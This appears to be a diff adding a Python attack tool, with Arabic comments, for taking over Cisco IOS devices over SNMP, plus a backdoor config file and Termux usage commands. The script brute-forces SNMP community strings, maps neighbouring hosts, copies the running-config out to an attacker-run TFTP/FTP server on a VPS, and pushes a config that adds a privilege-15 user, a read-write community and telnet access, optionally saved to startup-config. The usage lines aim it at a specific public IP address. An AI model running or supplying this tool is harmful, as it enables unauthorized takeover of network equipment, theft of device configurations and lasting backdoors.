@@ -1,0 +1,369 @@
+pkg update -y && pkg upgrade -y
+pkg install -y python net-snmp
+pip install tftpy pyftpdlib
+termux-wake-lock      # يمنع Android من قتل العملية أثناء النقل
+
+
+nano cisco-snmp-takeover.py
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+cisco-snmp-takeover.py — سحب بيانات وتحكم كامل في أجهزة Cisco IOS عبر SNMP RW
+يعمل على Termux/Linux. يتطلب: net-snmp + tftpy (+ pyftpdlib لوضع FTP)
+
+الاستعمال:
+  python3 cisco-snmp-takeover.py -t 1.2.3.4                        # كشف تلقائي + سحب الإعدادات
+  python3 cisco-snmp-takeover.py -t 1.2.3.4 -c private -s 5.6.7.8  # المستمع على VPS
+  python3 cisco-snmp-takeover.py -t 1.2.3.4 -c private -s 5.6.7.8 --proto ftp -u ftpuser -p ftppass
+  python3 cisco-snmp-takeover.py -t 1.2.3.4 -c private -s 5.6.7.8 --push admin.cfg --telnet
+"""
+import argparse, os, re, shutil, socket, subprocess, sys, threading, time
+
+CC       = "1.3.6.1.4.1.9.9.96.1.1.1.1"   # ccCopyTable
+SYS_DESCR= "1.3.6.1.2.1.1.1.0"
+SYS_NAME = "1.3.6.1.2.1.1.5.0"
+
+WORDLIST = ["public","private","cisco","router","switch","admin","secret","enable",
+ "management","monitor","test","default","cisco123","snmp","snmpd","read","write",
+ "all","any","local","internal","security","guest","public123","private123",
+ "ilmi","ats","vlan2","wan","lan","rmon","netman","changeme","Cisco123","P@ssw0rd"]
+
+LOGF = None
+def log(s):
+    print(s)
+    if LOGF: LOGF.write(s + "\n"); LOGF.flush()
+
+def run(cmd, t=8):
+    try:
+        return subprocess.run(cmd, capture_output=True, text=True, timeout=t)
+    except subprocess.TimeoutExpired:
+        return None
+
+def ok(v):
+    if not v: return False
+    low = v.lower()
+    return not any(x in low for x in ("timeout","no response","noaccess","notwritable",
+        "nosuchname","nosuchobject","nosuchinstance","authorizationerror","generr","badvalue"))
+
+def snmpget(ip, comm, oid, ver="2c", t=2):
+    r = run(["snmpget", f"-v{ver}", "-c", comm, "-Oqv", "-t", str(t), "-r", "0", ip, oid], t+2)
+    return r.stdout.strip() if r else ""
+
+def snmpset(ip, comm, oid, typ, val, ver="2c", t=3):
+    r = run(["snmpset", f"-v{ver}", "-c", comm, "-Oqv", "-t", str(t), "-r", "0", ip, oid, typ, val], t+2)
+    return r.stdout.strip() if r else ""
+
+def snmpwalk(ip, comm, oid, ver="2c", t=6):
+    r = run(["snmpwalk", "-On", f"-v{ver}", "-c", comm, "-t", str(t), "-r", "0", ip, oid], t*4)
+    return r.stdout.splitlines() if r else []
+
+# ---------- كشف المجتمع (RO/RW) ----------
+def find_ro(ip):
+    for ver in ("2c","1"):
+        for c in WORDLIST:
+            d = snmpget(ip, c, SYS_DESCR, ver, t=1)
+            if ok(d):
+                log(f"[+] RO: '{c}' (v{ver}) -> {d.splitlines()[0][:60]}")
+                return c, ver
+    return None, None
+
+def is_rw(ip, comm, ver):
+    nm = snmpget(ip, comm, SYS_NAME, ver, t=2)
+    if not ok(nm): return False
+    out = snmpset(ip, comm, SYS_NAME, "s", nm, ver, t=2)   # كتابة نفس القيمة (بدون أثر)
+    return ok(out)
+
+# ---------- الاستطلاع ----------
+def recon(ip, comm, ver):
+    log("\n=== معلومات الجهاز ===")
+    for oid, name in [(SYS_DESCR,"sysDescr"),(SYS_NAME,"sysName"),
+                      ("1.3.6.1.2.1.1.6.0","sysLocation"),("1.3.6.1.2.1.1.4.0","sysContact"),
+                      ("1.3.6.1.2.1.1.3.0","sysUpTime")]:
+        v = snmpget(ip, comm, oid, ver, t=4)
+        if ok(v): log(f"  {name}: {v[:200]}")
+
+    log("\n=== الواجهات ===")
+    for line in snmpwalk(ip, comm, "1.3.6.1.2.1.2.2.1.2", ver):
+        m = re.search(r"\.2\.1\.2\.(\d+)\s*=\s*STRING:\s*(.*)", line)
+        if m: log(f"  if{m.group(1)}: {m.group(2)}")
+
+    log("\n=== عناوين IP ===")
+    for line in snmpwalk(ip, comm, "1.3.6.1.2.1.4.20.1.1", ver):
+        if "=" in line: log("  " + line.split(" = ")[1])
+
+    log("\n=== جدول ARP (المضيفون المجاورون) ===")
+    arp = {}
+    for line in snmpwalk(ip, comm, "1.3.6.1.2.1.4.22.1.2", ver):
+        m = re.search(r"\.22\.1\.2\.(\d+)\.([\d.]+)\s*=\s*STRING:\s*(\S+)", line)
+        if m: arp[m.group(2)] = (m.group(1), m.group(3))
+    for a, (i, mac) in sorted(arp.items()):
+        log(f"  {a:16s}  via if{i:<3s}  {mac}")
+
+    log("\n=== الأجهزة الداخلية (سيريالات) ===")
+    for line in snmpwalk(ip, comm, "1.3.6.1.4.1.9.9.92.1.1.1.1.2", ver):   # serial
+        if "=" in line: log("  " + line.split(" = ",1)[1])
+    for line in snmpwalk(ip, comm, "1.3.6.1.4.1.9.9.92.1.1.1.1.3", ver):   # descr
+        if "=" in line: log("  " + line.split(" = ",1)[1])
+
+    log("\n=== جيران CDP ===")
+    for line in snmpwalk(ip, comm, "1.3.6.1.4.1.9.9.23.1.2.1.1.6", ver):
+        if "=" in line: log("  CDP: " + line.split(" = ",1)[1])
+
+# ---------- خوادم الاستقبال ----------
+def udp_free(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try: s.bind(("0.0.0.0", port)); return True
+    except OSError: return False
+    finally: s.close()
+
+def tcp_free(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try: s.bind(("0.0.0.0", port)); return True
+    except OSError: return False
+    finally: s.close()
+
+def start_tftp(directory, port=69):
+    from tftpy import TftpServer
+    if not udp_free(port):
+        sys.exit(f"[!] المنفذ UDP/{port} مشغول — أغلقه أو استخدم iptables REDIRECT")
+    os.makedirs(directory, exist_ok=True)
+    threading.Thread(target=TftpServer(directory).listen, args=("0.0.0.0", port), daemon=True).start()
+    time.sleep(0.5)
+    log(f"[+] TFTP مستمع على UDP/{port} — الدليل: {directory}")
+
+def start_ftp(directory, user, pw, port=21):
+    from pyftpdlib.authorizers import DummyAuthorizer
+    from pyftpdlib.handlers import FTPHandler
+    from pyftpdlib.servers import FTPServer
+    if not tcp_free(port):
+        sys.exit(f"[!] المنفذ TCP/{port} مشغول")
+    os.makedirs(directory, exist_ok=True)
+    a = DummyAuthorizer(); a.add_user(user, pw, directory, perm="elradfmw")
+    h = FTPHandler; h.authorizer = a
+    FTPServer(("0.0.0.0", port), h).serve_forever.__self__
+    threading.Thread(target=FTPServer(("0.0.0.0", port), h).serve_forever, daemon=True).start()
+    log(f"[+] FTP مستمع على TCP/{port} — {user}:{pw} — الدليل: {directory}")
+
+# ---------- CISCO-CONFIG-COPY-MIB (النسخة V2: RowStatus .14 / State .10 / FailCause .13) ----------
+def used_indexes(ip, comm, ver):
+    used = set()
+    for line in snmpwalk(ip, comm, f"{CC}.14", ver, t=5):
+        m = re.search(r"\.14\.(\d+)\s*=", line)
+        if m: used.add(int(m.group(1)))
+    return used
+
+def create_copy(ip, comm, ver, idx, proto, src, dst, server, fname, user="", pw=""):
+    args = [f"{CC}.2.{idx}", "i", str(proto),   # tftp=1 ftp=2
+            f"{CC}.3.{idx}", "i", str(src),     # networkFile=1 startup=3 running=4
+            f"{CC}.4.{idx}", "i", str(dst),
+            f"{CC}.5.{idx}", "a", server,
+            f"{CC}.6.{idx}", "s", fname]
+    if user: args += [f"{CC}.7.{idx}", "s", user]
+    if pw:   args += [f"{CC}.8.{idx}", "s", pw]
+    args += [f"{CC}.14.{idx}", "i", "4"]        # createAndGo — يجب أن يكون الأخير
+    r = run(["snmpset", f"-v{ver}", "-c", comm, "-Oqv", "-t", "4", "-r", "0", ip] + args, 12)
+    if not r or r.returncode != 0:
+        raise RuntimeError("snmpset فشل: " + ((r.stderr.strip() if r else "") or "لا استجابة"))
+
+def wait_copy(ip, comm, ver, idx, timeout):
+    t0 = time.time()
+    while time.time() - t0 < timeout:
+        st = snmpget(ip, comm, f"{CC}.10.{idx}", ver, t=3)   # ccCopyState
+        if st == "3": return True, None                       # successful
+        if st == "4":                                         # failed
+            return False, snmpget(ip, comm, f"{CC}.13.{idx}", ver, t=3)
+        time.sleep(3)
+    return False, "انتظار انتهى"
+
+def destroy(ip, comm, ver, idx):
+    snmpset(ip, comm, f"{CC}.14.{idx}", "i", "6", ver, t=3)   # destroy
+
+# ---------- سحب الإعدادات ----------
+def exfil(ip, comm, ver, server, outdir, proto, user, pw, port, timeout):
+    os.makedirs(outdir, exist_ok=True)
+    fname = f"cfg-{ip}-{time.strftime('%Y%m%d-%H%M%S')}.cfg"
+    if proto == "tftp": start_tftp(outdir, port)
+    else:               start_ftp(outdir, user or "cisco", pw or "cisco", port)
+
+    used = used_indexes(ip, comm, ver)
+    idx = max(1000, (max(used) + 1 if used else 1000))        # صف جديد غير مستخدم
+    log(f"[*] حقن صف النسخ #{idx}: running-config -> {server}/{fname} ({proto})")
+    try:
+        create_copy(ip, comm, ver, idx, 1 if proto=="tftp" else 2, 4, 1, server, fname, user, pw)
+        okc, fc = wait_copy(ip, comm, ver, idx, timeout)
+        if okc:
+            log(f"[+] تم السحب: {outdir}/{fname}")
+            return os.path.join(outdir, fname)
+        log(f"[-] فشل النقل — failCause={fc}  (3=timeout يعني خادم الاستقبال غير مرئي للراوتر)")
+        return None
+    finally:
+        destroy(ip, comm, ver, idx); log("[+] الصف دُمّر")
+
+# ---------- حقن التحكم الكامل ----------
+def push(ip, comm, ver, server, cfgpath, proto, user, pw, port, timeout, save):
+    d = os.path.join(os.path.dirname(os.path.abspath(cfgpath)), ".push")
+    os.makedirs(d, exist_ok=True)
+    fname = os.path.basename(cfgpath)
+    shutil.copy(cfgpath, os.path.join(d, fname))
+    if proto == "tftp": start_tftp(d, port)
+    else:               start_ftp(d, user or "cisco", pw or "cisco", port)
+
+    used = used_indexes(ip, comm, ver)
+    idx = max(1000, (max(used) + 1 if used else 1000))
+    dest = 3 if save else 4    # startupConfig / runningConfig
+    log(f"[*] حقن صف النسخ #{idx}: {fname} -> {'startup' if save else 'running'}-config")
+    try:
+        create_copy(ip, comm, ver, idx, 1 if proto=="tftp" else 2, 1, dest, server, fname, user, pw)
+        okc, fc = wait_copy(ip, comm, ver, idx, timeout)
+        log("[+] تم تطبيق الإعداد — التحكم كامل الآن" if okc else f"[-] فشل التطبيق — failCause={fc}")
+        return okc
+    finally:
+        destroy(ip, comm, ver, idx); log("[+] الصف دُمّر")
+
+# ---------- جلسة Telnet تفاعلية (بدون حاجة لأدوات خارجية) ----------
+def telnet_shell(host, port=23):
+    s = socket.create_connection((host, port), timeout=10)
+    log(f"[+] متصل بـ {host}:{port} — اكتب exit للخروج، ثم enable ثم wr للحفظ")
+    def reader():
+        while True:
+            try:
+                d = s.recv(4096)
+                if not d: break
+                if d[0] == 255:   # تجاهل التفاوض IAC
+                    s.sendall(bytes([255, 254 if d[1] == 251 else 252, d[2]]))
+                    continue
+                sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
+            except Exception: break
+    threading.Thread(target=reader, daemon=True).start()
+    while True:
+        try:
+            line = sys.stdin.buffer.readline()
+            if not line: break
+            s.sendall(line.rstrip(b"\n") + b"\r\n")
+        except Exception: break
+    s.close()
+
+# ---------- أدوات مساعدة للشبكة ----------
+def outbound_ip(target):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((target, 161)); return s.getsockname()[0]
+    except Exception: return "0.0.0.0"
+    finally: s.close()
+
+def is_private(ip):
+    a = ip.split(".")
+    if a[0] == "10": return True
+    if a[0] == "172" and 16 <= int(a[1]) <= 31: return True
+    if a[0] == "192" and a[1] == "168": return True
+    if a[0] == "100" and 64 <= int(a[1]) <= 127: return True   # CGNAT
+    if a[0] == "169" and a[1] == "254": return True
+    return False
+
+def main():
+    ap = argparse.ArgumentParser(description="Cisco IOS SNMP takeover")
+    ap.add_argument("-t", "--target", required=True)
+    ap.add_argument("-c", "--community")
+    ap.add_argument("-s", "--server", help="عنوان خادم الاستقبال (VPS) — إجباري من خلف NAT")
+    ap.add_argument("--proto", choices=["tftp","ftp"], default="tftp")
+    ap.add_argument("-u", "--user"); ap.add_argument("-p", "--password")
+    ap.add_argument("--port", type=int, default=69)
+    ap.add_argument("--timeout", type=int, default=120)
+    ap.add_argument("--outdir", default="loot")
+    ap.add_argument("--push", metavar="FILE", help="حقن ملف كونفيغ (تحكم كامل)")
+    ap.add_argument("--save", action="store_true", help="الحقن في startup-config (يبقى بعد إعادة التشغيل)")
+    ap.add_argument("--telnet", action="store_true", help="فتح جلسة telnet بعد الحقن")
+    a = ap.parse_args()
+
+    if not shutil.which("snmpget"):
+        sys.exit("[!] ثبّت net-snmp:  pkg install net-snmp")
+
+    global LOGF
+    os.makedirs(a.outdir, exist_ok=True)
+    LOGF = open(os.path.join(a.outdir, f"recon-{a.target}.txt"), "a", encoding="utf-8")
+
+    # 1) كشف المجتمع
+    if a.community:
+        comm, ver = a.community, "2c"
+        if not ok(snmpget(a.target, comm, SYS_DESCR, ver, t=4)):
+            sys.exit(f"[!] لا استجابة بالمجتمع '{comm}' — جرب بدون -c للكشف التلقائي")
+    else:
+        log(f"[*] البحث عن مجتمع SNMP على {a.target} ...")
+        comm, ver = find_ro(a.target)
+        if not comm: sys.exit("[-] لا يوجد مجتمع معروف — جرّب -w بقائمة مخصصة")
+
+    rw = is_rw(a.target, comm, ver)
+    log(f"[+] {'RW (كتابة) — تحكم كامل متاح' if rw else 'RO (قراءة فقط)'}: '{comm}'")
+
+    # 2) الاستطلاع
+    recon(a.target, comm, ver)
+
+    if not rw:
+        log("[-] المجتمع للقراءة فقط — لا يمكن سحب الإعدادات أو الحقن")
+        sys.exit(0)
+
+    # 3) تحديد خادم الاستقبال (مشكلة NAT)
+    local_ip = outbound_ip(a.target)
+    if a.server:
+        server = a.server
+        if server == local_ip and not is_private(local_ip):
+            start_local = True
+        else:
+            start_local = False
+            log(f"\n[!] المستمع سيُشغَّل على {server} (VPS). شغّله هناك:\n"
+                f"    ssh root@{server} \"pip3 install tftpy && mkdir -p /tmp/loot && "
+                f"python3 -c \\\"from tftpy import TftpServer; TftpServer('/tmp/loot').listen('0.0.0.0',69)\\\"\"")
+            if a.proto == "ftp":
+                log(f"    أو لـ FTP:  ssh root@{server} \"pip3 install pyftpdlib && "
+                    f"python3 -m pyftpdlib -p 21 -u {a.user or 'cisco'} -P {a.password or 'cisco'} -d /tmp/loot -w\"")
+    else:
+        if is_private(local_ip):
+            sys.exit(f"\n[!] أنت خلف NAT ({local_ip}) — الراوتر لن يصل إليك.\n"
+                     f"    استخدم VPS:  python3 cisco-snmp-takeover.py -t {a.target} -c {comm} -s <IP_VPS> [--proto ftp ...]")
+        server = local_ip
+        start_local = True
+
+    # 4) سحب الإعدادات
+    if start_local or a.server:
+        exfil(a.target, comm, ver, server, a.outdir, a.proto, a.user, a.password, a.port, a.timeout)
+
+    # 5) حقن التحكم الكامل
+    if a.push:
+        okp = push(a.target, comm, ver, server, a.push, a.proto, a.user, a.password,
+                   a.port if start_local else 21 if a.proto=="ftp" else 69, a.timeout, a.save)
+        if okp and a.telnet:
+            time.sleep(6)
+            telnet_shell(a.target)
+
+    log("[+] انتهى.")
+
+if __name__ == "__main__":
+    main()
+    
+   ______________________
+   admin.cfg
+   
+   username pentest privilege 15 secret 0 P@ssw0rdX!
+enable secret 0 P@ssw0rdX!
+line vty 0 4
+ login local
+ transport input telnet ssh
+snmp-server community pentest RW
+!
+end
+______________________
+python3 cisco-snmp-takeover.py -t 105.155.252.6 -c private
+# أولًا شغّل المستمع على الـ VPS:
+ssh root@<IP_VPS> "pip3 install tftpy && mkdir -p /tmp/loot && python3 -c \"from tftpy import TftpServer; TftpServer('/tmp/loot').listen('0.0.0.0',69)\""
+
+# ثم من ترمكس:
+python3 cisco-snmp-takeover.py -t 105.155.252.6 -c private -s <IP_VPS>
+
+# اسحب الملف المحصود:
+scp root@<IP_VPS>:/tmp/loot/*.cfg loot/
+
+python3 cisco-snmp-takeover.py -t 105.155.252.6 -c private -s <IP_VPS> --proto ftp -u ftpuser -p ftppass
+
+python3 cisco-snmp-takeover.py -t 105.155.252.6 -c private -s <IP_VPS> --push admin.cfg --telnet
+# بعد الاتصال: enable → P@ssw0rdX → wr  (لحفظ الإعداد)
